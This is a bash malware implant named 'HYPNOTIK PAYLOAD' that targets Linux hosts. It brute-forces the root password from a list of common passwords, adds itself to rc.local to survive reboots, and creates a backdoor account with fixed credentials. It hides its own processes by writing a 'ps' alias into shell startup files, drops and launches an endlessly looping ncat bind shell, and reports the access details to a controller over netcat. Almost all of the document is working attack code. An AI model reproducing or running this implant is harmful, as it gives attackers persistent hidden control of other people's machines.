#!/bin/bash
#
# Regards, the Alveare Solutions society,
#
# HYPNOTIK PAYLOAD

declare -A CONSCRIPT_COMMANDS

SCRIPT_NAME='HYpnotiK'
VERSION='Infiltrator'
VERSION_NO='1.0'
VERSION_TARGET_OS='Linux'
VERSION_TARGET_ARCH='x32,x64'

# HOT PARAMETERS

HYPNOTIK_ANCHOR_PATH="./.hyp-cache"
MINION_ANCHOR_PATH="./.ema-cache"
CONSCRIPT_ADDR=`curl whatismyip.akamai.com 2> /dev/null`
RAW_BACKDOOR_PATH='./.hyp-rsbd-cache'
RAW_BACKDOOR_LOG_PATH="./.hyp-rbdl-cache"
RAW_BACKDOOR_ADDRESS="$CONSCRIPT_ADDR"
RAW_BACKDOOR_PORT=8081
MASTER_MIND_ADDRESS='127.0.0.1'
MASTER_MIND_PORT=8080
SSH_BACKDOOR_PORT=8082
CONSCRIPT_INTERPRETER_PATH='/bin/bash'
CNX_TIMEOUT=5
ATTEMPT_LIMIT=5
IDENTIFIER="c${RANDOM}"
USER='conscript'
PASSWORD='secret'
CNX_PROTOCOL='raw'
# [ NOTE ]: Add your dictionary here -
COMMON_PASSWORDS=(
'toor'
'root'
'qwerty'
'1234567890'
'admin'
'password'
'default'
'abcdefgh'
)

# COLD PARAMETERS

SCRIPT_PATH="$0"
RC_LOCAL_PATH='/etc/rc.d/rc.local'
BASH_RC=".bashrc"
RAW_BACKDOOR_PID=
PHOME_HOME_SIG=
ROOT_PASS=
CONSCRIPT_COMMANDS=(
['create-hypnotik-anchor']=" touch $HYPNOTIK_ANCHOR_PATH"
['delete-minion-anchor']=" rm -rf $MINION_ANCHOR_PATH"
['create-rc-local']=" touch $RC_LOCAL_PATH"
['set-boot-init']=" echo $SCRIPT_PATH >> $RC_LOCAL_PATH"
['start-ssh-server']=" service ssh start"
['create-user']=" useradd $USER && echo -e \"${PASSWORD}\n${PASSWORD}\" | passwd $USER"
['delete-user']=" userdel $USER"
['apt-install']=" apt-get install"
['external-ip']=" curl whatismyip.akamai.com 2> /dev/null"
['find-bashrc']="find / -name '$BASH_RC' -type f 2> /dev/null"
)
BASH_STARTUP_SCRIPTS=(
"/etc/profile"
"/etc/bash_profile"
"/etc/bashrc"
)
APT_DEPENDENCIES=(
'expect'
'ssh'
'nc'
'curl'
)

# INSTALLERS

function install_dependencies () {
    local FAILURE_COUNT=0
    for package in ${APT_DEPENDENCIES[@]}; do
        type "$package" &> /dev/null
        if [ $? -eq 0 ]; then
            continue
        fi
        exec_super_user_command "${CONSCRIPT_COMMANDS['apt-install']} $package"
        if [ $? -ne 0 ]; then
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
        fi
    done
    return $FAILURE_COUNT
}

# SETTERS

function set_command_cloak_alias () {
    local COMMAND="$1"
    local CLOAK_COMMAND="$2"
    local EXIT_CODE=0
    for script_path in `fetch_all_bash_startup_scripts`; do
        local ALIAS="alias ${COMMAND}='${CLOAK_COMMAND}'"
        COMMAND_STRING=`format_set_alias_to_script_path_instruction \
            "$ALIAS" "$script_path"`
        local EC_CMD=`${COMMAND_STRING} &> /dev/null`
        local EXIT_CODE=$((EXIT_CODE + $EC_CMD))
    done
    return $EXIT_CODE
}

function set_conscript_address () {
    CONSCRIPT_ADDR=`fetch_external_ipv4_address`
    RAW_BACKDOOR_ADDRESS="$CONSCRIPT_ADDR"
    return $?
}

# CREATORS

function create_conscript_user () {
    if [ -z "$ROOT_PASS" ]; then
        ${CONSCRIPT_COMMANDS['create-user']} &> /dev/null
    else
        exec_super_user_command ${CONSCRIPT_COMMANDS['create-user']} &> /dev/null
    fi
    return $?
}

function create_hypnotik_payload_anchor () {
    if [ -z "$ROOT_PASS" ]; then
        ${CONSCRIPT_COMMANDS['create-hypnotik-anchor']} &> /dev/null
    else
        exec_super_user_command ${CONSCRIPT_COMMANDS['create-user']} &> /dev/null
    fi
    return $?
}

# GENERAL

function self_destruct () {
    rm -rf "$SCRIPT_PATH" &> /dev/null
    return $?
}

function cloak_hypnotik_processes () {
    set_command_cloak_alias 'ps' "ps | grep -v hypnotik | grep -v $RAW_BACKDOOR_PORT"
    return $?
}

function issue_phone_home_signal () {
    local PREVIOUS_EXIT_CODES="$@"
    if [ -z "$PHOME_HOME_SIG" ]; then
        return 1
    fi
    echo "${PHOME_HOME_SIG},${PREVIOUS_EXIT_CODES}" | \
        nc -w $CNX_TIMEOUT "$MASTER_MIND_ADDRESS" $MASTER_MIND_PORT &> /dev/null
    return $?
}

function open_ssh_backdoor () {
    local EXIT_CODE=0
    attempt_start_ssh_server
    local EXIT_CODE=$((EXIT_CODE + $?))
    create_conscript_user
    local EXIT_CODE=$((EXIT_CODE + $?))
    return $EXIT_CODE
}

function open_raw_socket_backdoor () {
    generate_raw_backdoor_script_file
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        return $EXIT_CODE
    fi
    local ARGUMENTS=( `format_open_backdoor_cargo_script_arguments` )1
    ${RAW_BACKDOOR_PATH} ${ARGUMENTS[@]} &
    RAW_BACKDOOR_PID=$!
    bg
    if [ -z "$RAW_BACKDOOR_PID" ]; then
        return 1
    fi
    return 0
}

function root_login () {
    local ROOT_PASS="$1"
    echo -e "$ROOT_PASS\n" | su root
    return $?
}

function lift_evil_minion_anchor () {
    if [ ! -f "$MINION_ANCHOR_PATH" ]; then
        return 0
    fi
    rm -f "$MINION_ANCHOR_PATH" &> /dev/null
    return $?
}

function exec_super_user_command () {
    local SU_CMD="$@"
    expect -c "spawn su root -c $SU_CMD; expect \"*assword*\"; send \"$ROOT_PASS\r\; interact" | \
        grep -v "spawn" | grep -v "Password"
    return $?
}

function root_user_dictionary_attack () {
    for pass in ${COMMON_PASSWORDS[@]}; do
        root_login "$pass"
        if [ $? -eq 0 ]; then
            ROOT_PASS="$pass"
            echo "$ROOT_PASS" > "$HYPNOTIK_ANCHOR_PATH"
            return 0
        fi
    done
    return 1
}

function open_backdoor () {
    case "$CNX_PROTOCOL" in
        'raw')
            open_raw_socket_backdoor
            ;;
        'ssh')
            open_ssh_backdoor
            ;;
        *)
            return 3
            ;;
    esac
    return $?
}

# ATTEMPTS

function attempt_privilege_escalation () {
    local CACHED_ROOT_PASS=`cat "$HYPNOTIK_ANCHOR_PATH"`
    if [ ! -z "$CACHED_ROOT_PASS" ]; then
        root_login "$pass"
        if [ $? -eq 0 ]; then
            ROOT_PASS="$CACHED_ROOT_PASS"
            return 0
        fi
        echo -n > "$HYPNOTIK_ANCHOR_PATH"
    fi
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        root_user_dictionary_attack
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

function attempt_set_boot_init () {
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        if [ -z "$ROOT_PASS" ]; then
            ${CONSCRIPT_COMMANDS['set-boot-init']} &> /dev/null
        else
            exec_super_user_command "${CONSCRIPT_COMMANDS['set-boot-init']} &> /dev/null"
        fi
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

function attempt_process_cloak () {
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        cloak_hypnotik_processes
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

function attempt_user_creation () {
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        create_conscript_user
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

function attempt_start_ssh_server () {
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        exec_super_user_command "${CONSCRIPT_COMMANDS['start-ssh']}"
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

# FORMATTERS

function format_set_alias_to_script_path_instruction () {
    local ALIAS="$1"
    local SCRIPT_PATH="$2"
    echo "echo '$ALIAS' 2> /dev/null >> '$SCRIPT_PATH'; echo "'$?'
    return $?
}

function format_open_backdoor_cargo_script_arguments () {
    local ARGUMENTS=(
        "--running-mode=endless"
        "--port=${RAW_BACKDOOR_PORT}"
        "--log-file=${RAW_BACKDOOR_LOG_PATH}"
        "--shell=${CONSCRIPT_INTERPRETER_PATH}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_phone_home_signal () {
    local PH_SIG="crecord-update ${IDENTIFIER},${CONSCRIPT_ADDR},${RAW_BACKDOOR_PORT},${CNX_PROTOCOL},${USER},${PASSWORD}"
    echo "$PH_SIG"
    return $?
}

# GENERATORS

function generate_raw_backdoor_script_file () {
    local FILE_CONTENT="`fetch_raw_backdoor_script_content`"
    echo "$FILE_CONTENT" > "$RAW_BACKDOOR_PATH"
    chmod +x "$RAW_BACKDOOR_PATH" &> /dev/null
    return $?
}

# INIT

function init_hypnotik () {
    if [ -f "$HYPNOTIK_ANCHOR_PATH" ]; then
        open_backdoor &> /dev/null
        return $?
    fi
    create_hypnotik_payload_anchor
    local EXIT_CODE_CHPA=$?
    attempt_privilege_escalation
    local EXIT_CODE_APE=$?
    if [ $EXIT_CODE_APE -eq 0 ]; then
        install_dependencies
        local EXIT_CODE_INST=$?
    fi
    attempt_set_boot_init
    local EXIT_CODE_SBI=$?
    attempt_user_creation
    local EXIT_CODE_AUC=$?
    attempt_process_cloak
    local EXIT_CODE_APC=$?
    format_phone_home_signal
    local EXIT_CODE_FPHS=$?
    lift_evil_minion_anchor
    local EXIT_CODE_LEMA=$?
    open_backdoor
    local EXIT_CODE_OBD=$?
    local STATUS_CODES="$EXIT_CODE_CHPA,$EXIT_CODE_SBI,$EXIT_CODE_AUC,$EXIT_CODE_APC,$EXIT_CODE_APE,$EXIT_CODE_INST,$EXIT_CODE_FPHS,$EXIT_CODE_LEMA,$EXIT_CODE_OBD,$EXIT_CODE_IPHS"
    issue_phone_home_signal "$STATUS_CODES"
    return $?
}

# FETCHERS

function fetch_all_user_bashrc_files () {
    local CONNECTION_DETAILS="$1"
    local COMMAND_STRING="${CONSCRIPT_COMMANDS['find-bashrc']}"
    for path in `${COMMAND_STRING}`; do
        if [ -z "$path" ]; then
            continue
        fi
        echo "$path"
    done
    return 0
}

function fetch_bash_shell_startup_scripts () {
    echo "${BASH_STARTUP_SCRIPTS[@]}"
    return $?
}

function fetch_all_bash_startup_scripts () {
    fetch_bash_shell_startup_scripts
    fetch_all_user_bashrc_files
    return $?
}

function fetch_external_ipv4_address () {
    ${CONSCRIPTS_COMMANDS['external-ip']}
    return $?
}

function fetch_raw_backdoor_script_content () {
    cat<<EOF
#!/bin/bash

RUNNING_MODE='endless'
CONNECTION_LIMIT=3
FOREGROUND_FLAG=0
PORT_NUMBER=8080
VERBOSITY=0
SHELL_PATH='/bin/bash'

function set_shell_path () {
    local PATH="\$1"
    if [ ! -f "\$PATH" ]; then
        local PATH='/bin/bash'
    fi
    SHELL_PATH="\$PATH"
    return 0
}

function set_foreground_flag () {
    local FLAG=\$1
    if [ ! \$FLAG -eq 0 ] && [ ! \$FLAG -eq 1 ]; then
        local FLAG=0
    fi
    FOREGROUND_FLAG=\$FLAG
    return 0
}

function increment_verbosity_level () {
    local INCREMENT_BY=\$1
    check_is_integer \$INCREMENT_BY
    if [ \$? -ne 0 ]; then
        return 1
    fi
    NEW_LEVEL=\`echo "\$INCREMENT_BY + \$VERBOSITY" | bc\`
    if [ \$NEW_LEVEL -gt 3 ] || [ \$NEW_LEVEL -lt 0 ]; then
        return 2
    fi
    VERBOSITY=\$NEW_LEVEL
    return 0
}

function set_running_mode () {
    local MODE="\$1"
    if [[ "\$MODE" != 'single' ]] \\
            && [[ "\$MODE" != 'limited' ]] \\
            && [[ "\$MODE" != 'endless' ]]; then
        local MODE='single'
    fi
    RUNNING_MODE="\$MODE"
    return 0
}

function set_connection_limit () {
    local CNX_LIMIT=\$1
    check_is_integer \$CNX_LIMIT
    if [ \$? -ne 0 ]; then
        return 1
    elif [ \$CNX_LIMIT -eq 0 ]; then
        local CNX_LIMIT=3
    fi
    CONNECTION_LIMIT=\$CNX_LIMIT
    return 0
}

function set_port_number () {
    local PORT=\$1
    check_is_integer \$PORT
    if [ \$? -ne 0 ]; then
        return 1
    fi
    PORT_NUMBER=\$PORT
    return 0
}

function set_log_file_path () {
    local FILE_PATH="\$1"
    if [ ! -f "\$FILE_PATH" ]; then
        touch \$FILE_PATH &> /dev/null
        if [ \$? -ne 0 ]; then
            local FILE_PATH=""
        fi
    fi
    LOG_FILE="\$FILE_PATH"
    return 0
}

function check_is_integer () {
    local VALUE=\$1
    test \$VALUE -eq \$VALUE &> /dev/null
    return \$?
}

function raw_backdoor () {
    local PORT="\$1"
    local SHELL="\$2"
    local VERBOSITY_LVL=\$3
    if [ -f "\$LOG_FILE" ]; then
        OUTPUT="\$LOG_FILE"
    else
        OUTPUT="/dev/null"
    fi
    case \$VERBOSITY_LVL in
        0)
            ncat -l -p \$PORT -e "\$SHELL" &> /dev/null
            ;;
        1)
            ncat -v -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
        2)
            ncat -vv -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
        3)
            ncat -vvv -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
    esac
    return $?
}

function raw_backdoor_single_mode () {
    raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
    return $?
}

function raw_backdoor_limited_mode () {
    for item in \`seq \$CONNECTION_LIMIT\`; do
        raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
    done
    return 0
}

function raw_backdoor_endless_mode () {
    COUNT=1
    while :
    do
        raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
        if [ \$? -ne 0 ]; then
            sleep 2
            continue
        fi
        COUNT=\$((COUNT + 1))
    done
    return 0
}

function init_raw_backdoor_single_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_single_mode &
            ;;
        1)
            raw_backdoor_single_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_limited_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_limited_mode &
            ;;
        1)
            raw_backdoor_limited_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_endless_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_endless_mode &
            ;;
        1)
            raw_backdoor_endless_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor () {
    case "\$RUNNING_MODE" in
        'single')
            init_raw_backdoor_single_mode
            ;;
        'limited')
            init_raw_backdoor_limited_mode
            ;;
        'endless')
            init_raw_backdoor_endless_mode
            ;;
    esac
}

if [ \$# -eq 0 ] || [ \$# -gt 7 ] ; then
    exit 1
fi

for opt in "\$@"
do
    case "\$opt" in
        -h|--help)
            exit 0
            ;;
        -f|--foreground)
            set_foreground_flag 1
            ;;
        -v|--verbose)
            increment_verbosity_level 1
            ;;
        -vv|--vverbose)
            increment_verbosity_level 2
            ;;
        -vvv|--vvverbose)
            increment_verbosity_level 3
            ;;
        -r=*|--running-mode=*)
            set_running_mode "\${opt#*=}"
            ;;
        -c=*|--connection-limit=*)
            set_connection_limit "\${opt#*=}"
            ;;
        -p=*|--port=*)
            set_port_number "\${opt#*=}"
            ;;
        -l=*|--log-file=*)
            set_log_file_path "\${opt#*=}"
            ;;
        -s=*|--shell=*)
            set_shell_path "\${opt#*=}"
            ;;
    esac
done

init_raw_backdoor
exit \$?

EOF
}

# MISCELLANEOUS

init_hypnotik
exit $?
